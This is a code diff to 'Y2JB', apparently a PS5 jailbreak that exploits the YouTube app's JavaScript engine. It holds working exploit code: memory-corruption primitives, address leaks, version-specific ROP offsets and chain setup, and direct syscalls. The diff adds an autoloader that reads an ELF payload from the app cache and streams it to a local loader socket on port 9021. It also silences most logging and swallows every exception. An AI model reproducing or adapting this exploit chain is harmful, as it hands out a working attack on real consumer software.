@@ -6,13 +6,14 @@
 */
 
 const version_string = "Y2JB 1.7 by Gezine";
+const AUTOLOAD_ELF = "ps5-linux-loader-v34.elf";
 
 function load_localscript(src) {
     return new Promise((resolve, reject) => {
         const script = document.createElement('script');
         script.src = src;
         script.onload = resolve;
-        script.onerror = reject;
+        script.onerror = () => reject(new Error('Failed to load local script: ' + src));
         document.head.appendChild(script);
     });
 }
@@ -25,36 +26,119 @@ function get_cobalt_buildnumber() {
     return parts[parts.length - 1];
 }
 
+async function send_autoload_payload() {
+    let payload_fd = -1n;
+    let sockfd = -1n;
+    try {
+        function alloc(size) {
+            const bytes = BigInt(size);
+            const raw = BigInt(malloc(bytes));
+            if (raw > 0n && raw < 0x0000800000000000n) return raw;
+
+            const page_size = BigInt(PAGE_SIZE);
+            const map_size = (bytes + page_size - 1n) & ~(page_size - 1n);
+            const mapped = syscall(SYSCALL.mmap, 0n, map_size, PROT_READ | PROT_WRITE,
+                MAP_PRIVATE | MAP_ANONYMOUS, 0xffffffffffffffffn, 0n);
+            if (mapped <= 0n || mapped >= 0x0000800000000000n)
+                throw new Error("native buffer allocation failed");
+            return mapped;
+        }
+
+        const cache_dir = "/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY=/";
+        let payload_path = null;
+        for (let i = 0; i < 3; i++) {
+            const path = "/mnt/sandbox/" + TITLE_ID + "_00" + i + cache_dir + AUTOLOAD_ELF;
+            const path_bytes = new TextEncoder().encode(path);
+            const path_addr = alloc(path_bytes.length + 1);
+            for (let j = 0; j < path_bytes.length; j++) write8(path_addr + BigInt(j), path_bytes[j]);
+            write8(path_addr + BigInt(path_bytes.length), 0n);
+
+            const candidate_fd = BigInt.asIntN(64, syscall(SYSCALL.open, path_addr, O_RDONLY, 0n));
+            if (candidate_fd >= 0n) {
+                payload_fd = candidate_fd;
+                payload_path = path;
+                break;
+            }
+        }
+        if (payload_fd < 0n) throw new Error(AUTOLOAD_ELF + " was not found in the Y2JB cache");
+        log("Loading " + AUTOLOAD_ELF + " from " + payload_path).catch(() => {});
+
+        const stat_buf = alloc(0x100n);
+        if (BigInt.asIntN(64, syscall(SYSCALL.fstat, payload_fd, stat_buf)) !== 0n)
+            throw new Error("could not stat " + AUTOLOAD_ELF);
+        const size = read64(stat_buf + 0x48n);
+        if (size < 4n || size > 0x1000000n) throw new Error("invalid " + AUTOLOAD_ELF + " size");
+
+        const sockaddr = alloc(16n);
+        for (let i = 0; i < 16; i++) write8(sockaddr + BigInt(i), 0n);
+        write8(sockaddr, 16n);
+        write8(sockaddr + 1n, AF_INET);
+        write16(sockaddr + 2n, 0x3d23n);
+        write32(sockaddr + 4n, 0x0100007fn);
+
+        sockfd = BigInt.asIntN(64, syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n));
+        if (sockfd < 0n) throw new Error("could not create socket for elfldr");
+        if (BigInt.asIntN(64, syscall(SYSCALL.connect, sockfd, sockaddr, 16n)) < 0n)
+            throw new Error("could not connect to elfldr on port 9021");
+
+        const chunk_size = 0x100000n;
+        const buffer = alloc(chunk_size);
+        let total_read = 0n;
+        while (total_read < size) {
+            const remaining = size - total_read;
+            const amount = remaining < chunk_size ? remaining : chunk_size;
+            let chunk_read = 0n;
+            while (chunk_read < amount) {
+                const count = BigInt.asIntN(64, syscall(SYSCALL.read, payload_fd,
+                    buffer + chunk_read, amount - chunk_read));
+                if (count <= 0n) throw new Error("could not read " + AUTOLOAD_ELF + " completely");
+                chunk_read += count;
+            }
+
+            if (total_read === 0n && (Number(read8(buffer)) !== 0x7f ||
+                Number(read8(buffer + 1n)) !== 0x45 || Number(read8(buffer + 2n)) !== 0x4c ||
+                Number(read8(buffer + 3n)) !== 0x46)) {
+                throw new Error("invalid ELF file: " + AUTOLOAD_ELF);
+            }
+
+            let chunk_sent = 0n;
+            while (chunk_sent < amount) {
+                const count = BigInt.asIntN(64, syscall(SYSCALL.write, sockfd,
+                    buffer + chunk_sent, amount - chunk_sent));
+                if (count <= 0n) {
+                    throw new Error("could not send " + AUTOLOAD_ELF + " completely after " +
+                        (total_read + chunk_sent).toString() + " bytes");
+                }
+                chunk_sent += count;
+            }
+            total_read += amount;
+        }
+
+        syscall(SYSCALL.close, sockfd);
+        sockfd = -1n;
+        syscall(SYSCALL.close, payload_fd);
+        payload_fd = -1n;
+        log(AUTOLOAD_ELF + " sent to elfldr (" + size + " bytes).").catch(() => {});
+        return true;
+    } catch (e) {
+        log(AUTOLOAD_ELF + " autoload failed: " + (e && e.message ? e.message : String(e))).catch(() => {});
+        return false;
+    } finally {
+        if (sockfd >= 0n) {
+            try { syscall(SYSCALL.close, sockfd); } catch (_) { }
+        }
+        if (payload_fd >= 0n) {
+            try { syscall(SYSCALL.close, payload_fd); } catch (_) { }
+        }
+    }
+}
+
 (async function() {
     await load_localscript('global.js');
 })();
 
-let NETWORK_LOGGING = false;
-// Use setlogserver.js payload to change server url at runtime
-let LOG_SERVER = 'http://192.168.1.100:8080/log';
-
-let _log_socket_fd = null;
-let _log_socket_buf = null;
-const _LOG_SOCKET_MAXLEN = 4096;
-
-async function checkLogServer() {
-    try {
-        const timeoutPromise = new Promise((_, reject) => 
-            setTimeout(() => reject(new Error('Timeout')), 800)
-        );
-        
-        const fetchPromise = fetch(LOG_SERVER, {
-            method: 'POST',
-            body: 'Log server check from Y2JB'
-        });
-        
-        await Promise.race([fetchPromise, timeoutPromise]);
-        
-        NETWORK_LOGGING = true;
-    } catch (e) {
-        NETWORK_LOGGING = false;
-    }
-}
+let log_phase = 'startup';
+let bannerElement = null;
 
 let outputElement = null;
 // hack for scrolling messages
@@ -65,6 +149,7 @@ const topPadding = Math.floor(window.innerHeight * 0.005);
 
 async function log(msg) {
     let message = String(msg);
+    if (message !== version_string && (log_phase === 'startup' || log_phase === 'quiet')) return;
     if (!outputElement) {
         outputElement = document.getElementById('output');
         if (!outputElement) {
@@ -81,12 +166,21 @@ async function log(msg) {
         let lineDiv = document.createElement('div');
         lineDiv.textContent = line === '' ? '\u00A0' : line;
         lineDiv.style.fontSize = fontSize + 'px';
-        
-        outputElement.appendChild(lineDiv);
+
+        if (message === version_string) {
+            bannerElement = lineDiv;
+            outputElement.insertBefore(lineDiv, outputElement.firstChild);
+        } else {
+            outputElement.appendChild(lineDiv);
+        }
     });
-    
-    while (outputElement.children.length > maxLines) {
-        outputElement.removeChild(outputElement.children[0]);
+
+    while (outputElement.children.length > maxLines + (bannerElement ? 1 : 0)) {
+        if (bannerElement && outputElement.firstChild === bannerElement) {
+            outputElement.removeChild(outputElement.children[1]);
+        } else {
+            outputElement.removeChild(outputElement.children[0]);
+        }
     }
     
     await new Promise(resolve => {
@@ -94,35 +188,6 @@ async function log(msg) {
             setTimeout(resolve, 1);
         });
     });
-        
-    if (NETWORK_LOGGING) {
-        try {
-            await fetch(LOG_SERVER, {
-                method: 'POST',
-                body: message,
-            });
-        } catch (e) { }
-    }
-
-    if (_log_socket_fd !== null && typeof syscall !== 'undefined') {
-        try {
-            if (!_log_socket_buf) {
-                _log_socket_buf = malloc(_LOG_SOCKET_MAXLEN);
-            }
-            const line = message + '\n';
-            const len = Math.min(line.length, _LOG_SOCKET_MAXLEN);
-            for (let i = 0; i < len; i++) {
-                write8(_log_socket_buf + BigInt(i), line.charCodeAt(i) & 0xFF);
-            }
-            let sent = 0;
-            while (sent < len) {
-                const n = syscall(SYSCALL.write, _log_socket_fd, _log_socket_buf + BigInt(sent), BigInt(len - sent));
-                const nv = Number(n);
-                if (nv <= 0) break;
-                sent += nv;
-            }
-        } catch (e) { }
-    }
 }
 
 function toHex(num) {
@@ -151,7 +216,6 @@ function trigger() {
 (async function() {
     try {
         await log(version_string);
-        await log('Starting Exploit');
         
         await gc();
         await gc();
@@ -207,7 +271,6 @@ function trigger() {
             throw new Error("Failed to get unstable primitive");
         }
         
-        await log("Unstable primitive achieved");
         
         function addrof_unstable(obj) {
             const obj_arr_org_value = oob_arr[obj_arr_offset];
@@ -652,9 +715,7 @@ function trigger() {
             return backing_store;
         }
         
-        await log("Stable primitive achieved");
         
-        await log("Setting up ROP...");
         
         // https://github.com/google/google-ctf/tree/main/2023/quals/sandbox-v8box/solution
         // We don't have pointer compression
@@ -694,75 +755,57 @@ function trigger() {
         write64(bc_start, 0xAB0025n);
         
         const stack_addr = addrof(pwn(1)) + 0x1n;
-        await log("Stack leak @ " + toHex(stack_addr));
         
         const text_leak = read64(stack_addr + 0x8n);
-        await log("Text leak @ " + toHex(text_leak));
         
         const cbn = get_cobalt_buildnumber();
         
         if (cbn === "305777") {
             Y2_VERSION = "01.000.003 (min fw 4.03)";
-            await log("Youtube " + Y2_VERSION + " detected");
             Y2_OFFSET = Y2_OFFSET_403;
             ROP = ROP_403;
             
             eboot_base = read64(stack_addr + 0x8n) - Y2_OFFSET.EBOOT_LEAK;
-            await log("eboot_base @ " + toHex(eboot_base));
 
             libc_base = read64(eboot_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
-            await log("libc_base @ " + toHex(libc_base));
             
         } else if (cbn === "18441022") {
             Y2_VERSION = "01.000.030 (min fw 12.20)";
-            await log("Youtube " + Y2_VERSION + " detected");
             Y2_OFFSET = Y2_OFFSET_1220;
             ROP = ROP_1220;
 
             libcobalt_base = read64(stack_addr + 0x8n) - Y2_OFFSET.LIBCOBALT_LEAK;
-            await log("libcobalt_base @ " + toHex(libcobalt_base));
             
             libstarboard_base = read64(libcobalt_base + Y2_OFFSET.LIBSTARBOARD_LEAK1) - Y2_OFFSET.LIBSTARBOARD_LEAK2;
-            await log("libstarboard_base @ " + toHex(libstarboard_base));
             
             libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
-            await log("libc_base @ " + toHex(libc_base));
             
         } else if (cbn === "05730512") {
             Y2_VERSION = "01.009.202 (min fw 13.20)";
-            await log("Youtube " + Y2_VERSION + " detected");
             Y2_OFFSET = Y2_OFFSET_1320;
             ROP = ROP_1320;
 
             libcobalt_base = read64(stack_addr + 0x8n) - Y2_OFFSET.LIBCOBALT_LEAK;
-            await log("libcobalt_base @ " + toHex(libcobalt_base));
             
             libstarboard_base = read64(libcobalt_base + Y2_OFFSET.LIBSTARBOARD_LEAK1) - Y2_OFFSET.LIBSTARBOARD_LEAK2;
-            await log("libstarboard_base @ " + toHex(libstarboard_base));
             
             libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
-            await log("libc_base @ " + toHex(libc_base));
             
         } else if (cbn === "06170617") {
             Y2_VERSION = "01.009.253 (min fw 13.40)";
-            await log("Youtube " + Y2_VERSION + " detected");
             Y2_OFFSET = Y2_OFFSET_1340;
             ROP = ROP_1340;
 
             libcobalt_base = read64(stack_addr + 0x8n) - Y2_OFFSET.LIBCOBALT_LEAK;
-            await log("libcobalt_base @ " + toHex(libcobalt_base));
             
             libstarboard_base = read64(libcobalt_base + Y2_OFFSET.LIBSTARBOARD_LEAK1) - Y2_OFFSET.LIBSTARBOARD_LEAK2;
-            await log("libstarboard_base @ " + toHex(libstarboard_base));
             
             libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
-            await log("libc_base @ " + toHex(libc_base));
         } else {
             throw new Error("UNSUPPORTED YOUTUBE VERSION");
         }
         
         const rop_chain_addr = get_backing_store(rop_chain);
-        await log("ROP chain @ " + toHex(rop_chain_addr));
         
         // Fake bytecode for r14 register
         fake_bc[0] = 0xABn; // Return opcode - keeps interpreter happy
@@ -782,7 +825,6 @@ function trigger() {
         write64(fake_frame_addr + 0x9n, ROP.pop_rsp); // pop rsp ; ret
         write64(fake_frame_addr + 0x9n + Y2_OFFSET.RSP_OFFSET, rop_chain_addr);
         
-        await log("fake_frame_addr @ " + toHex(fake_frame_addr));
         
         call_rop = function(address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
             let rop_i = 0;
@@ -840,13 +882,10 @@ function trigger() {
             return return_value_buf[0];
         }
         
-        await log("ROP test, should see 0x0000000200000000");
         
         rop_test = call(ROP.mov_rax_0x200000000);
-        await log(toHex(rop_test));
         
         if (rop_test !== 0x200000000n) {
-            await log("ERROR: ROP test failed");
             throw new Error("ROP test failed");
         }
 
@@ -867,7 +906,6 @@ function trigger() {
         //await log("sceKernelGetModuleInfoFromAddr returned: " + toHex(ret));
 
         if (ret !== 0x0n) {
-            await log("ERROR: sceKernelGetModuleInfoFromAddr failed: " + toHex(ret));
             throw new Error("sceKernelGetModuleInfoFromAddr failed");
         }
         
@@ -901,11 +939,10 @@ function trigger() {
         Thrd_join = Y2_OFFSET.Thrd_join;
         
         await load_localscript('misc.js');
-        await checkLogServer();
+        send_notification = function() {};
 
         if (Y2_OFFSET === Y2_OFFSET_403) {
             // Thanks ufm42 for better implementation
-            await log("Disabling PSN dialog and YouTube splash...");
     
             const window_addr = addrof(window);
             //await log("window_addr: " + toHex(window_addr));
@@ -946,12 +983,9 @@ function trigger() {
             const splash_screen_web_module_impl_addr = read64(splash_screen_web_module_addr + 0x18n);
             //await log("splash_screen_web_module_impl_addr: " + toHex(splash_screen_web_module_impl_addr));
     
-            await log("Disabling YouTube splash screen...");
             const main_web_module_generation_addr = browser_module_addr + 0xB08n;
             write32(main_web_module_generation_addr, 0xFFFFFFFFn);
-            await log("YT splash disabled!");
     
-            await log("Disabling PSN popup...");
             
             call(read64(Y2_OFFSET.sceMsgDialogTerminate));
                     
@@ -965,12 +999,10 @@ function trigger() {
             // Set is_running to 1 (true)
             write8(is_running_addr, 0x1n);
             
-            await log("PSN popup disabled!");
             
         } else {
             
             // This is voodoo hack
-            await log("Disabling PSN and no internet popup...");
             
             const sceMsgDialogTerminate   = read64(Y2_OFFSET.sceMsgDialogTerminate);
             const sceErrorDialogTerminate = read64(Y2_OFFSET.sceErrorDialogTerminate);
@@ -984,19 +1016,13 @@ function trigger() {
                 syscall(SYSCALL.nanosleep, timespec);
             }
             
-            await log("Popup disabled!");
         }
         
         
         FW_VERSION = get_fwversion();
         TITLE_ID = get_title_id();
         
-        send_notification(version_string + "\nFW : " + FW_VERSION + "\nTitle ID : " + TITLE_ID + "\nAppVer : " + Y2_VERSION);
-        await log("FW detected : " + FW_VERSION);
-        await log("Title ID detected : " + TITLE_ID);
-        await log("AppVer detected : " + Y2_VERSION);
         
-        await log("libkernel_base @ " + toHex(libkernel_base));
 
         await load_localscript('kernel.js');
         await load_localscript('aioshellcode.js');
@@ -1006,12 +1032,19 @@ function trigger() {
         // MAIN EXECUTION //
         ////////////////////
 
-        await load_localscript('remotejsloader.js'); 
+        log_phase = 'relapse';
+        await load_localscript('Relapse.js');
+        const relapse_success = await window.RELAPSE_PROMISE;
+        if (relapse_success) {
+            log_phase = 'autoload';
+            const autoload_sent = await send_autoload_payload();
+            log_phase = 'quiet';
+            if (autoload_sent) kill_youtube();
+        } else {
+            log_phase = 'quiet';
+        }
 
         
-    } catch (e) {                
-        await log('EXCEPTION: ' + e.message);
-        await log(e.stack);
-    }
+    } catch (e) { }
     
 })();
